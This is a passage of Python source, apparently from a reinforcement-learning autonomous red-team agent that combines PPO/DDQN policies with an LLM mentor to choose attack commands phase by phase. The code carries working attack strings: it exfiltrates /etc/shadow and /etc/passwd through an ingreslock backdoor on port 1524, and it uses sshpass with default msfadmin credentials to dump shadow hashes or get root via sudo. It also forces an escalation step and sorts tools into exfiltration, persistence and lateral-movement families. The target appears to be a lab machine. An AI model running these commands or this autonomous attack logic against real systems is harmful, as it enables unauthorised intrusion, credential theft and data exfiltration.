        confidence = confidence if confidence is not None else 0.5
        ctx = step_ctx.attack_context
        
        # =====================================================================
        # PHASE 6.9: CLOSEOUT HARD GATE
        # Once phase transitions to CLOSEOUT, ONLY closeout commands are allowed.
        # No recon, no exploitation, no scanning, no lateral movement.
        # This enforces real-world red-team discipline: exfil → cleanup → exit.
        # =====================================================================
        if ctx and ctx.current_phase == AttackPhase.CLOSEOUT:
            return self._decide_closeout_only(step_ctx)
        
        # ─── PHASE 5.2+: Skill Library query ────────────────────────
        # Before main pipeline, check if skill library has a high-confidence match
        skill_result = self._query_skill_library(step_ctx)
        
        # ─── PHASE 4: Playbook curriculum (annealing) ────────────────
        # Early episodes: follow proven playbooks. Later: let PPO/registry drive.
        playbook_result = self._playbook_suggest(step_ctx)
        if playbook_result is not None:
            # Still apply anti-repeat guard below
            # but return playbook suggestion as primary choice
            pass  # Will be checked below after anti-repeat
        
        # Track previous phase for transition detection
        prev_phase = getattr(self, '_last_phase', None)
        current_phase = ctx.current_phase
        self._last_phase = current_phase

        # R49/R52: Track consecutive steps in PRIV_ESC and LATERAL_MOVEMENT
        # for escalation shortcuts. Both phases can grind without progress.
        if current_phase == AttackPhase.PRIVILEGE_ESCALATION:
            self._privesc_steps = getattr(self, '_privesc_steps', 0) + 1
        elif getattr(self, '_privesc_steps', 0) > 0:
            # Phase changed away from PRIV_ESC — reset
            self._privesc_steps = 0
        
        # R52: Track LATERAL_MOVEMENT steps for forced root escalation
        if current_phase == AttackPhase.LATERAL_MOVEMENT:
            self._lateral_steps = getattr(self, '_lateral_steps', 0) + 1
        elif getattr(self, '_lateral_steps', 0) > 0:
            self._lateral_steps = 0
        
        # =====================================================================
        # PHASE 6.2: MENTOR CONTROLLER — 3-tier budget+fade with triggers
        # Replaces Phase 6.1 hard 3-condition gating.
        # MentorController evaluates: uncertainty, stagnation, phase transition,
        # EXFIL curriculum gate, warmup, budget floor.
        # Returns MentorEngagement with tier, model, and guidance flags.
        # =====================================================================
        should_call_gpt = False
        gpt_reason = None
        mentor_engagement: Optional[MentorEngagement] = None
        
        if self.mentor_controller is not None:
            # Use the new 3-tier controller
            phase_changed = (prev_phase is not None and current_phase != prev_phase)
            # Phase 9.0: Pass DDQN confidence for macro-uncertainty trigger
            _ddqn_conf = None
            if hasattr(self, 'ddqn_macro') and self.ddqn_macro is not None:
                try:
                    _ddqn_conf = self.ddqn_macro.get_confidence_metrics()
                except Exception:
                    pass
            mentor_engagement = self.mentor_controller.should_engage(
                confidence=confidence,
                phase_changed=phase_changed,
                prev_phase=prev_phase.name if prev_phase is not None else None,
                current_phase=current_phase.name,
                force=force_mentor,
                ddqn_confidence=_ddqn_conf,
            )
            if mentor_engagement.engage:
                should_call_gpt = True
                gpt_reason = f"{mentor_engagement.trigger.value}:{mentor_engagement.reason}"
                # Phase 7.3: Do NOT reset stagnation on mentor call — only reset on
                # actual discoveries (record_result). This prevents the stagnation→mentor→
                # reset→stagnation cycle where mentor fires every 4 steps but nothing
                # actually advances.
                # self._stagnation_steps = 0  # REMOVED — reset only on real progress
        else:
            # Fallback: legacy 3-condition gating (Phase 6.1 compat)
            stagnation_steps = getattr(self, '_stagnation_steps', 0)
            
            if prev_phase is not None and current_phase != prev_phase:
                should_call_gpt = True
                gpt_reason = f"phase_transition:{prev_phase.name}->{current_phase.name}"
                self._stagnation_steps = 0
            elif stagnation_steps > 5 and self.reward_calculator.is_stuck():
                should_call_gpt = True
                gpt_reason = f"hard_stagnation(steps={stagnation_steps})"
                self._stagnation_steps = 0
            elif force_mentor:
                should_call_gpt = True
                gpt_reason = "forced_mentor"
        
        # Check if GPT is available
        gpt_available = (
            self.smart_mentor is not None
            and self.gpt_manager is not None
            and not self.gpt_manager.is_offline()
        )
        
        # Pre-compute filtered commands for this agent's role
        valid_commands = get_valid_commands_for_state(ctx.state_flags, ctx.current_phase)
        if not valid_commands:
            valid_commands = get_valid_commands_for_state(ctx.state_flags)
        if not valid_commands:
            valid_commands = [
                cmd for cmd in COMMAND_REGISTRY.values()
                if cmd.phase == AttackPhase.RECON and not cmd.preconditions
            ]
        filtered_commands = self._filter_commands_for_role(valid_commands)
        
        # =====================================================================
        # PHASE 7.1: FORWARD-ONLY PHASE GATE + EXPLOITED-SERVICE FILTER
        # 1. Remove commands from phases BEHIND current phase
        # 2. Remove exploit commands targeting already-exploited services
        # 3. Inject exploited_services from discovery_board into ctx for filtering
        # =====================================================================
        
        # Inject exploited-service info from discovery_board (passed via state_flags)
        discovery_board = step_ctx.state.get("discovery_board", {})
        if discovery_board:
            ctx.state_flags["_exploited_services"] = discovery_board.get("exploited_services", set())
            ctx.state_flags["_exploited_ports"] = discovery_board.get("exploited_ports", set())
        
        # Apply forward-only phase gating
        filtered_commands = self._filter_phase_forward(filtered_commands, current_phase)
        
        # Apply exploited-service filtering
        filtered_commands = self._filter_exploited_services(filtered_commands, ctx)
        
        # Phase 7.2: Remove brute-force commands when credentials already known
        filtered_commands = self._filter_creds_aware(filtered_commands, ctx)
        
        # =====================================================================
        # PHASE 9.0: DDQN MACRO-INTENT SELECTION
        # Before PPO picks a concrete command, DDQN picks the strategic
        # macro-intent (RECON_FOCUS, CREDENTIAL_CHAIN, SERVICE_EXPLOIT, etc.)
        # PPO is then constrained to commands within that macro-intent.
        # This creates a natural hierarchy: DDQN=strategy, PPO=tactics.
        # =====================================================================
        self._active_macro = None
        self._active_macro_q = None
        self._ddqn_confidence = 0.0
        self._ddqn_pending = None
        
        if self.ddqn_macro is not None:
            try:
                import torch as _torch
                _, _, _, encode_state = _lazy_ppo()
                if encode_state is not None:
                    state_dict = step_ctx.state if step_ctx.state else {}
                    state_tensor = encode_state(
                        state_dict, _torch.device("cpu"),
                        current_step=step_ctx.step,
                        max_steps=250,
                    )
                    phase_name = current_phase.name if current_phase else "RECON"
                    # R57 Layer 1: Pass discovery signal for stagnation detection
                    _had_disc = getattr(self, '_last_step_had_discovery', False)
                    macro, q_values, confidence = self.ddqn_macro.select_macro(
                        state_tensor, phase_name,
                        had_discovery=_had_disc,
                    )
                    self._active_macro = macro
                    self._active_macro_q = q_values
                    self._ddqn_confidence = confidence
                    self._ddqn_pending = {
                        "state": state_tensor,
                        "macro": macro.value,
                        "prev_macro": self._ddqn_prev_macro,  # R57 Layer 1: track for switch penalty
                    }
                    self._ddqn_prev_macro = macro.value  # R57: remember for next step
                    logger.debug(
                        f"[DDQN][{self.agent_name}] Macro={macro.name} "
                        f"conf={confidence:.2f} ε={self.ddqn_macro.epsilon:.3f}"
                    )
            except Exception as e:
                logger.debug(f"[DDQN][{self.agent_name}] Macro select failed: {e}")
        
        # Make decision based on hybrid logic
        # PHASE 6.4: MENTOR-FIRST → PPO-TAKEOVER pipeline
        # Early episodes: mentor leads, PPO observes (builds demonstration buffer).
        # Later episodes: PPO leads, mentor only called on uncertainty/stagnation.
        # The crossover is controlled by a dynamic mentor_lead_rate that fades
        # from 35% to 15% as PPO builds confidence (Phase 6.5 tuning).
        # 
        # Decision priority: Skill Library → Playbook → CODEX STRATEGIC → CODEX TACTICAL → (Mentor OR PPO) → Registry
        
        # =====================================================================
        # R66: ENTROPY GATING — Modulate PPO exploration by coherence + macro_conf
        # Low coherence → higher entropy (need more exploration)
        # High macro confidence + high coherence → lower entropy (exploit)
        # =====================================================================
        if self.ppo_agent is not None:
            _coh = self._r66_coherence
            _mconf = self._r66_macro_conf
            if _coh < 0.30:
                # Collapsing coherence → boost exploration
                self.ppo_agent._entropy_adaptive_multiplier = min(
                    2.0, self.ppo_agent._entropy_adaptive_multiplier * 1.4
                )
            elif _coh > 0.65 and _mconf > 0.70:
                # High coherence + confident macro → reduce exploration
                self.ppo_agent._entropy_adaptive_multiplier = max(
                    0.5, self.ppo_agent._entropy_adaptive_multiplier * 0.85
                )
        
        # =====================================================================
        # LAYER 3: CODEX META-LAYER — Tactical + Strategic stagnation-breaking
        # Codex-tactical: phase-level stagnation (existing _codex_meta_check)
        # Codex-strategic: episode-level plan repair (R66 new)
        # =====================================================================
        codex_meta_result = self._codex_meta_check(
            step_ctx, current_phase, filtered_commands
        )
        # R66: If tactical didn't fire, try strategic
        if codex_meta_result is None:
            codex_meta_result = self._codex_strategic_check(
                step_ctx, current_phase, filtered_commands
            )
        
        if skill_result is not None:
            result = skill_result
        elif playbook_result is not None:
            result = playbook_result
        elif codex_meta_result is not None:
            result = codex_meta_result
            # Store negative PPO trajectory: PPO/DDQN failed to break stagnation
            if self._ppo_pending is not None:
                if self.ppo_agent is not None:
                    try:
                        self.ppo_agent.store_transition(
                            state=self._ppo_pending["state"],
                            action=self._ppo_pending["action"],
                            log_prob=self._ppo_pending["log_prob"],
                            reward=-3.0,  # PPO failed to break stagnation
                            value=self._ppo_pending["value"],
                            done=False,
                        )
                    except Exception:
                        pass
                self._ppo_pending = None
        else:
            # Phase 6.5: Compute dynamic mentor_lead_rate
            # Starts at 35%, decays to 15% over ~50 episodes.
            # PPO confidence (low entropy) accelerates the decay.
            base_mentor_rate = max(0.15, 0.35 - self.current_episode * 0.004)
            
            # Accelerate decay if PPO is learning well (low entropy = confident)
            ppo_confidence_boost = 0.0
            if self.ppo_agent and hasattr(self.ppo_agent, 'training_metrics'):
                recent_entropy = self.ppo_agent.training_metrics.get('entropy', [])
                if recent_entropy:
                    # Lower entropy → more confident → less mentor needed
                    avg_entropy = sum(recent_entropy[-5:]) / max(len(recent_entropy[-5:]), 1)
                    max_entropy = self.ppo_agent.config.entropy_coef * 10  # rough max
                    if max_entropy > 0:
                        ppo_confidence_boost = max(0, 0.10 * (1.0 - avg_entropy / max_entropy))
            
            effective_mentor_rate = max(0.15, base_mentor_rate - ppo_confidence_boost)
            
            # Roll dice: mentor leads vs PPO leads
            import random as _rand
            mentor_leads = (_rand.random() < effective_mentor_rate)
            
            result = None  # Will be set by whichever path succeeds
            
            if mentor_leads and gpt_available:
                # MENTOR-FIRST: Let mentor pick the command, store as demo for PPO
                logger.debug(
                    f"[{self.agent_name}] Mentor-first (rate={effective_mentor_rate:.2f}, "
                    f"ep={self.current_episode})"
                )
                # Determine model from engagement tier
                if mentor_engagement is not None and mentor_engagement.engage:
                    orig_model = self.model
                    self.model = mentor_engagement.model
                    _exfil_hint = (
                        "Focus on data exfiltration via ingreslock backdoor. Try: "
                        "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet target 1524, "
                        "{ echo 'base64 /etc/passwd'; sleep 2; } | timeout 10 telnet target 1524."
                    ) if getattr(mentor_engagement, 'exfil_guidance', False) else None
                    result = self._decide_with_mentor(
                        step_ctx, proposed_action, confidence, filtered_commands,
                        exfil_prompt=_exfil_hint,
                    )
                    self.model = orig_model
                else:
                    result = self._decide_with_mentor(
                        step_ctx, proposed_action, confidence, filtered_commands
                    )
                
                if result.mentor_call:
                    # Phase 6.4: ALSO run PPO to build trajectory, but DON'T use its decision.
                    # Store mentor's template as _mentor_suggestion so PPO gets
                    # imitation bonus when it agrees with the mentor.
                    result._mentor_suggestion = result.template_name
                    
                    # Run PPO shadow selection (for learning, not for execution)
                    if self.ppo_agent and self.action_mapper:
                        ppo_shadow = self._ppo_select_command(step_ctx, filtered_commands)
                        if ppo_shadow is not None:
                            # PPO made a choice — store its trajectory.
                            # The reward it gets will include mentor conformity bonus
                            # if PPO independently chose the same template.
                            result._mentor_suggestion = result.template_name
                            # _ppo_pending is already set by _ppo_select_command
                else:
                    # Mentor call failed — fall through to PPO
                    mentor_leads = False
            
            # If mentor didn't lead or mentor call failed, PPO takes over
            if result is None or not getattr(result, 'mentor_call', False):
                # PPO-FIRST (or mentor failed): PPO drives, mentor advises
                ppo_result = None
                if self.ppo_agent and self.action_mapper:
                    ppo_result = self._ppo_select_command(step_ctx, filtered_commands)
                
                if ppo_result is not None:
                    result = ppo_result
                    # If mentor should have been called (per controller), attach as advisory
                    if (should_call_gpt and gpt_available and mentor_engagement is not None):
                        logger.debug(
                            f"[{self.agent_name}] Mentor advisory: {gpt_reason} "
                            f"(tier={mentor_engagement.tier.value})"
                        )
                        orig_model = self.model
                        self.model = mentor_engagement.model
                        _exfil_hint2 = (
                            "Focus on data exfiltration via ingreslock backdoor. Try: "
                            "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet target 1524, "
                            "{ echo 'base64 /etc/passwd'; sleep 2; } | timeout 10 telnet target 1524."
                        ) if getattr(mentor_engagement, 'exfil_guidance', False) else None
                        mentor_result = self._decide_with_mentor(
                            step_ctx, proposed_action, confidence, filtered_commands,
                            exfil_prompt=_exfil_hint2,
                        )
                        self.model = orig_model
                        if mentor_result.mentor_call:
                            mentor_result.mentor_reasoning = f"[{gpt_reason}] {mentor_result.mentor_reasoning or ''}"
                            mentor_result._mentor_suggestion = mentor_result.template_name
                            result._mentor_suggestion = mentor_result.template_name
                            # For DELIBERATIVE tier: override PPO with mentor
                            if mentor_engagement.tier == MentorTier.DELIBERATIVE:
                                result = mentor_result
                elif should_call_gpt and gpt_available:
                    # PPO unavailable, use mentor directly
                    logger.debug(f"[{self.agent_name}] GPT call triggered: {gpt_reason}")
                    result = self._decide_with_mentor(step_ctx, proposed_action, confidence, filtered_commands)
                    result.mentor_reasoning = f"[{gpt_reason}] {result.mentor_reasoning or ''}"
                else:
                    # Registry-first: efficient, no token usage
                    result = self._decide_from_registry(step_ctx, proposed_action, confidence)
                    if should_call_gpt and not gpt_available:
                        logger.debug(f"[{self.agent_name}] GPT needed but unavailable, using registry")
        
        # =========================================================================
        # FINAL SAFETY: Check role exclusivity BEFORE anti-repeat
        # =========================================================================
        is_valid_role = self._validate_command_for_role(result.command)
        
        # =========================================================================
        # PHASE 6.6: DIFFICULTY GATE — Block commands banned by current preset
        # =========================================================================
        if self.difficulty_preset is not None and result.template_name:
            if result.template_name in self.difficulty_preset.blocked_commands:
                logger.info(
                    f"[{self.agent_name}] DIFFICULTY-BLOCKED: '{result.template_name}' "
                    f"banned in {self.difficulty_preset.name} mode"
                )
                # Replace with alternative from same phase
                alt = self._get_difficulty_alternative(step_ctx)
                if alt is not None:
                    result = alt
                    result.source = "difficulty_gate"
                    result.reasoning = f"Difficulty {self.difficulty_preset.name}: {result.template_name} blocked → alternative"
        
        # =========================================================================
        # R52: UNIFIED PHASE-STUCK ESCALATION SHORTCUT (replaces R49/R50/R51)
        # When the offensive agent is stuck in PRIV_ESC or LATERAL_MOVEMENT
        # without root_shell_obtained, force a targeted sshpass root attempt.
        #
        # PRIV_ESC: fires at step 3 and every 3 steps after (3, 6, 9, ...)
        #   - Lowered from 10→3 because R51 showed PRIV_ESC only lasts ~2 steps
        #     so the old threshold NEVER fired. Now fires on 3rd step.
        #
        # LATERAL_MOVEMENT: fires at step 5 and every 5 steps after (5, 10, 15, ...)
        #   - R51 showed agents grind 10-15 steps in LATERAL waiting for
        #     domain_admin_obtained (only from enum4linux). Root shell would
        #     cascade: root → POST_EXPLOITATION → CLOSEOUT (if exfil/persist exist).
        #
        # Pre-cleanup: kill stale SSH connections before sshpass attempt.
        # SSH failure threshold: max 3 failures per episode.
        # =========================================================================
        _privesc_steps = getattr(self, '_privesc_steps', 0)
        _lateral_steps = getattr(self, '_lateral_steps', 0)
        _should_escalate = False
        _escalation_source_phase = ""
        _escalation_step_count = 0

        if (self.agent_role.get("role") == "offensive"
                and not ctx.state_flags.get("root_shell_obtained")
                and getattr(self, '_ssh_failures_this_episode', 0) < 3):
            if (current_phase == AttackPhase.PRIVILEGE_ESCALATION
                    and _privesc_steps >= 5
                    and _privesc_steps % 5 == 0):  # R56: 3→5. Less aggressive in PRIV_ESC (duration gate keeps agent exploring)
                _should_escalate = True
                _escalation_source_phase = "PRIV_ESC"
                _escalation_step_count = _privesc_steps
            elif (current_phase == AttackPhase.LATERAL_MOVEMENT
                    and _lateral_steps >= 5
                    and _lateral_steps % 5 == 0
                    and ctx.state_flags.get("shell_obtained")):
                _should_escalate = True
                _escalation_source_phase = "LATERAL"
                _escalation_step_count = _lateral_steps

        if _should_escalate:
            target = ctx.target
            # R53: Alternate between sshpass root attempt and /etc/shadow dump.
            # R52 showed sshpass fails consistently on MS2 (Permission denied / 
            # connection issues) — agents stuck 40 steps with only sshpass.
            # Even-numbered fires → cat /etc/shadow (produces hash_known via parser)
            # Odd-numbered fires → sshpass root attempt (produces root_shell if works)
            _escalation_attempt = getattr(self, '_escalation_attempt_count', 0)
            self._escalation_attempt_count = _escalation_attempt + 1
            
            if _escalation_attempt % 2 == 0:
                # Even: cat /etc/shadow → produces hash_dump discovery → hash_known flag
                escalation_cmd = (
                    f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no "
                    f"-o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} "
                    f"'cat /etc/shadow 2>/dev/null'"
                )
                _esc_type = "shadow_dump"
            else:
                # Odd: sshpass root attempt → produces root_shell if sudo works
                escalation_cmd = (
                    f"pkill -f 'ssh.*{target}' 2>/dev/null; sleep 0.5; "
                    f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no "
                    f"-o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} "
                    f"'echo msfadmin | sudo -S id'"
                )
                _esc_type = "sshpass_root"
            
            result.command = escalation_cmd
            result.source = "privesc_escalation"
            result.confidence = 0.6
            result.mentor_reasoning = (
                f"[PHASE-ESCALATION] Forced {_esc_type} after "
                f"{_escalation_step_count} steps in {_escalation_source_phase}"
            )
            logger.info(
                f"[{self.agent_name}] [PHASE-ESCALATION] Forced {_esc_type} "
                f"at {_escalation_source_phase} step {_escalation_step_count}"
            )
            # Store negative PPO trajectory if this overrides a PPO decision
            if self._ppo_pending is not None:
                try:
                    ppo = self._lazy_ppo()
                    if ppo is not None:
                        ppo.store_transition(
                            self._ppo_pending['state'],
                            self._ppo_pending['action'],
                            self._ppo_pending['log_prob'],
                            -3.0,  # Negative reward: PPO failed to escalate
                            self._ppo_pending['value'],
                            False,
                        )
                        self._ppo_pending = None
                except Exception:
                    self._ppo_pending = None

        # =========================================================================
        # PHASE 6: PPO decisions BYPASS post-selection anti-repeat guard.
        # PPO already has comprehensive pre-selection masking in _decide_ppo():
        #   1. Filtered to role-valid commands only
        #   2. Precondition mask from get_action_mask_with_counts(max_repeats=1)
        #   3. Prefix count blocking (≥3 same prefix)
        # If PPO selected it through all those masks, TRUST IT. The old system
        # overrode ~58.8% of PPO decisions via post-selection anti-repeat,
        # destroying credit assignment. PPO must own its decisions to learn.
        #
        # Non-PPO decisions (playbook, registry, mentor, skill) still go through
        # the anti-repeat guard as before.
        # =========================================================================
        ppo_bypass = (result.source in ("ppo", "privesc_escalation", "codex_meta") and is_valid_role)
        
        # =========================================================================
        # PHASE 6.1: FAMILY-BASED ANTI-REPEAT WITH GRADED PENALTIES
        # 
        # Instead of hard-blocking any repeated command, we now:
        # 1. Classify commands into ACTION FAMILIES
        # 2. Track per-family usage counts
        # 3. Apply graded penalties: 1st repeat → small, 2nd → larger, 3rd → replace
        # 4. Role violations still get hard-replaced
        #
        # PPO decisions are still exempt (they have pre-selection masking).
        # =========================================================================
        all_cmds = ctx.command_history if ctx.command_history else []
        result_prefix = self._extract_tool_prefix(result.command) if result.command else ""
        result_cmd_norm = result.command.strip() if result.command else ""
        
        # Count in ENTIRE episode history
        exact_repeat_count = sum(1 for c in all_cmds if c.strip() == result_cmd_norm)
        prefix_repeat_count = sum(1 for c in all_cmds 
                                   if self._extract_tool_prefix(c) == result_prefix)
        
        # R42: PPO bypass should NOT apply to heavy prefix repeats.
        # In R41, Orion PPO looped ldapsearch 4+ times because PPO was fully exempt.
        # Now: if PPO picks the same prefix ≥3 times, treat it like non-PPO.
        # R50: privesc_escalation is a forced emergency override — NEVER revoke its bypass.
        if ppo_bypass and result.source == "ppo" and prefix_repeat_count >= 3:
            ppo_bypass = False
            logger.info(
                f"[{self.agent_name}] PPO bypass revoked: "
                f"prefix '{result_prefix}' used {prefix_repeat_count}x in episode"
            )
        
        # Determine action family for this command
        family = self._get_action_family(result_prefix)
        family_count = sum(
            1 for c in all_cmds
            if self._get_action_family(self._extract_tool_prefix(c)) == family
        )
        
        # Graded penalty tracking (stored on result for reward calculator)
        repeat_penalty = 0.0
        
        if not ppo_bypass:
            # Role violation → hard replace (always)
            if not is_valid_role:
                result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds, "role_violation")
            # Exact repeat → hard replace (3rd+ time) or penalty (1st-2nd)
            elif exact_repeat_count >= 3:
                result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds, 
                    f"exact_repeat_x{exact_repeat_count}")
            elif exact_repeat_count >= 1:
                # Graded: penalize but allow
                repeat_penalty = -2.0 * exact_repeat_count
                result.mentor_reasoning = (
                    f"[REPEAT-PENALTY:{repeat_penalty:.1f}] "
                    f"{result.mentor_reasoning or ''}"
                )
            # Family cooldown: if same family used >8 times, replace
            elif family_count >= 8:
                result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds,
                    f"family_cooldown({family}={family_count})")
            # Prefix repeat → penalize but allow up to 5, then replace
            elif prefix_repeat_count >= 5:
                result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds,
                    f"prefix_repeat_x{prefix_repeat_count}")
            elif prefix_repeat_count >= 2:
                repeat_penalty = -1.0 * (prefix_repeat_count - 1)
                result.mentor_reasoning = (
                    f"[PREFIX-PENALTY:{repeat_penalty:.1f}] "
                    f"{result.mentor_reasoning or ''}"
                )
        
        # Store repeat penalty for reward calculation
        result._repeat_penalty = repeat_penalty

        # =====================================================================
        # PHASE 7.1: SMART REASONING CHECK (codex-mini)
        # If the selected command belongs to a BEHIND phase or seems stuck,
        # ask codex-mini for quick reasoning guidance. Token-efficient: max 150 tokens.
        # Only triggers when: (1) agent is stagnating, OR (2) command seems wrong phase.
        # R60: codex_meta source ALWAYS skips reasoning check — it IS the highest
        # reasoning layer. Also track gate overrides for storm trigger.
        # =====================================================================
        _stag = getattr(self, '_stagnation_steps', 0)
        _cmd_phase_order = 0
        _cur_phase_order = self.PHASE_ORDER.get(current_phase, 0)
        cmd_template = None
        
        if result.template_name:
            # Look up the command's phase
            cmd_template = COMMAND_REGISTRY.get(result.template_name)
            if cmd_template:
                _cmd_phase_order = self.PHASE_ORDER.get(cmd_template.phase, 0)
        
        _needs_reasoning = False
        _reasoning_question = ""

        # R60: Codex Meta is the top reasoning layer — never second-guess it
        _skip_reasoning = (result.source == "codex_meta")
        
        # Case 1: Command is from a phase 2+ steps behind current
        if _skip_reasoning:
            pass  # R60: Codex output is trusted, skip all reasoning gates
        elif _cmd_phase_order < _cur_phase_order - 1 and not ppo_bypass:
            _needs_reasoning = True
            _reasoning_question = (
                f"I'm in {current_phase.name} but about to run a "
                f"{cmd_template.phase.name if cmd_template else 'unknown'}-phase command "
                f"({result.template_name}). Should I do something more phase-appropriate instead? "
                f"What command would advance me forward?"
            )
        
        # Case 2: Stagnating for 4+ steps — ask what to do differently
        elif _stag >= 4 and not ppo_bypass and gpt_available:
            _needs_reasoning = True
            _reasoning_question = (
                f"I've been in {current_phase.name} for {_stag} steps without new discoveries. "
                f"What should I try to break through to the next phase?"
            )
        
        # Case 3: Credentials found but still running credential-search commands
        if (ctx.state_flags.get("credentials_known") and result.template_name and
                any(kw in (result.template_name or "").lower() 
                    for kw in ["brute", "hydra", "crack", "pass"]) and not ppo_bypass):
            _needs_reasoning = True
            _reasoning_question = (
                f"I already have credentials. Why am I running {result.template_name}? "
                f"Should I use the known creds to exploit a service instead?"
            )
        
        # Case 4: Shell obtained but still running exploit commands
        if (ctx.state_flags.get("shell_obtained") and result.template_name and
                _cmd_phase_order <= self.PHASE_ORDER.get(AttackPhase.EXPLOITATION, 2) and
                _cur_phase_order > self.PHASE_ORDER.get(AttackPhase.EXPLOITATION, 2) and
                not ppo_bypass):
            _needs_reasoning = True
            _reasoning_question = (
                f"I already have a shell but I'm about to run {result.template_name} "
                f"(exploitation-level). Should I focus on post-exploitation or privesc instead?"
            )
        
        if _needs_reasoning and gpt_available:
            mentor_advice = self._ask_mentor_reasoning(step_ctx, _reasoning_question)
            if mentor_advice:
                # Inject reasoning into the result
                result.mentor_reasoning = (
                    f"[REASONING-CHECK] {mentor_advice[:200]} | "
                    f"{result.mentor_reasoning or ''}"
                )
                # If mentor suggests a specific command and we're not PPO-bypassed,
                # check if we should replace. Only replace for very backward commands.
                if _cmd_phase_order < _cur_phase_order - 1 and not ppo_bypass:
                    # Try to find a phase-appropriate command instead
                    phase_cmds = [
                        c for c in filtered_commands
                        if self.PHASE_ORDER.get(c.phase, 0) >= _cur_phase_order
                    ]
                    if phase_cmds:
                        alt_template = random.choice(phase_cmds)
                        params = {"target": ctx.target}
                        for param in alt_template.required_params:
                            if param not in params:
                                params[param] = self._get_default_param(param, ctx)
                        rendered = render_command(alt_template, params)
                        result.command = rendered
                        result.template_name = alt_template.name
                        result.params = params
                        result.source = "phase_gate_reasoning"
                        result.confidence = 0.65
                        logger.info(
                            f"[PHASE-GATE] {self.agent_name}: Replaced backward command "
                            f"with {alt_template.name} (phase={alt_template.phase.name})"
                        )
                        # R60: Track gate overrides for codex meta storm trigger
                        self._codex_meta_gate_overrides = getattr(
                            self, '_codex_meta_gate_overrides', 0
                        ) + 1
                        # Phase 7.2: Teach PPO that backward commands are bad
                        # Store negative reward so PPO learns not to propose them
                        if self._ppo_pending is not None:
                            self._store_ppo_negative_reward(-5.0, "backward_phase_command")

        # ─── PHASE 6.3: Populate reasoning trace + belief snapshot ───────
        # Build a human-readable chain-of-thought for every decision.
        reasoning_parts = []
        reasoning_parts.append(f"Phase={current_phase.name if hasattr(current_phase, 'name') else current_phase}")
        reasoning_parts.append(f"Source={result.source}")
        if result.mentor_call:
            reasoning_parts.append(f"Mentor={result.model_used or 'unknown'}")
            if result.mentor_reasoning:
                reasoning_parts.append(f"MentorReason={result.mentor_reasoning[:120]}")
        if ppo_bypass:
            reasoning_parts.append("PPO-bypass(trusted)")
        if repeat_penalty != 0.0:
            reasoning_parts.append(f"RepeatPenalty={repeat_penalty:.1f}")
        if gpt_reason:
            reasoning_parts.append(f"GPTTrigger={gpt_reason}")
        reasoning_parts.append(f"Cmd={result.command[:80] if result.command else 'NONE'}")
        result.reasoning = " → ".join(reasoning_parts)

        result.belief_snapshot = {
            "phase": current_phase.name if hasattr(current_phase, 'name') else str(current_phase),
            "confidence": confidence,
            "discoveries": len(ctx.state_flags) if ctx.state_flags else 0,
            "cmd_history_len": len(all_cmds),
            "exact_repeats": exact_repeat_count,
            "prefix_repeats": prefix_repeat_count,
            "family": family,
            "family_count": family_count,
            "ppo_bypass": ppo_bypass,
            "mentor_engaged": should_call_gpt,
            "mentor_tier": mentor_engagement.tier.value if mentor_engagement else None,
        }

        # Record decision
        self.decisions.append(result)
        
        # Log mentor call if applicable
        if result.mentor_call and self.mentor_log_path:
            self._log_mentor_call(step_ctx, proposed_action, result)
        
        return result
    
    # ─── ACTION FAMILY CLASSIFICATION ────────────────────────────────────
    ACTION_FAMILIES = {
        "recon": {"nmap", "masscan", "ping", "traceroute", "netdiscover", "arp-scan",
                  "unicornscan", "nbtscan", "fierce", "dnsrecon", "dig", "host",
                  "nslookup", "whois"},
        "enum": {"gobuster", "dirb", "dirsearch", "feroxbuster", "ffuf", "wfuzz",
                 "nikto", "whatweb", "enum4linux", "smbclient", "rpcclient",
                 "showmount", "rpcinfo", "finger", "smtp-user-enum", "snmpwalk",
                 "ldapsearch", "onesixtyone"},
        "access": {"hydra", "medusa", "ncrack", "patator", "crackmapexec",
                   "ssh", "telnet", "ftp", "mysql", "psql", "nc", "msfconsole",
                   "searchsploit", "sqlmap", "commix", "curl", "wget"},
        "web": {"xsstrike", "dalfox", "tplmap", "wpscan", "droopescan",
                "arjun", "paramspider", "linkfinder", "gospider", "hakrawler",
                "katana", "nuclei"},
        "lateral": {"smbclient", "psexec", "wmiexec", "evil-winrm", "impacket",
                    "chisel", "ligolo", "socat", "proxychains"},
        "exfil": {"scp", "rsync", "base64", "xxd", "tar", "zip"},
        "persist": {"crontab", "systemctl", "chmod", "chown", "useradd",
                    "passwd", "ssh-keygen"},
        "defense": {"ss", "ps", "last", "journalctl", "netstat", "lsof",
                    "iptables", "ufw", "fail2ban-client", "chkrootkit",
                    "rkhunter", "lynis", "osquery"},
    }
    
    @staticmethod
    def _extract_tool_prefix(cmd: str) -> str:
        """Extract the actual tool name from a command, handling piped compound commands.
        
        For regular commands like 'nmap -sV target', returns 'nmap'.
        For piped ingreslock commands like '{ echo ...; } | timeout 10 telnet target 1524',
        returns 'telnet' (the actual tool after the pipe).
        """
        cmd = cmd.strip()
        if not cmd:
            return ""
        # Handle { echo ...; } | timeout N tool target port
        if cmd.startswith("{"):
            pipe_idx = cmd.find("|")
            if pipe_idx >= 0:
                after_pipe = cmd[pipe_idx + 1:].strip()
                parts = after_pipe.split()
                # Skip 'timeout N' if present
                if len(parts) >= 3 and parts[0] == "timeout":
                    return parts[2].lower()
                elif parts:
                    return parts[0].lower()
        return cmd.split()[0].lower()

    def _get_action_family(self, cmd_prefix: str) -> str:
        """Classify a command prefix into an action family."""
        for family, tools in self.ACTION_FAMILIES.items():
            if cmd_prefix in tools:
                return family
        return "other"
    
    def _store_ppo_negative_reward(self, penalty: float, reason: str) -> None:
        """
        Phase 7.2: Store a negative reward for the pending PPO trajectory.
        
        When a PPO-selected command gets replaced (e.g., backward phase, wrong
        command), we inject a negative reward so PPO learns not to propose it again.
        This fixes the 'silent disconnect' where PPO never gets feedback on bad choices.
        """
        if self._ppo_pending is None:
            return
        
        try:
            ppo = self._lazy_ppo()
            if ppo is not None:
                ppo.store_transition(
                    state=self._ppo_pending["state"],
                    action=self._ppo_pending["action"],
                    log_prob=self._ppo_pending["log_prob"],
                    reward=penalty,
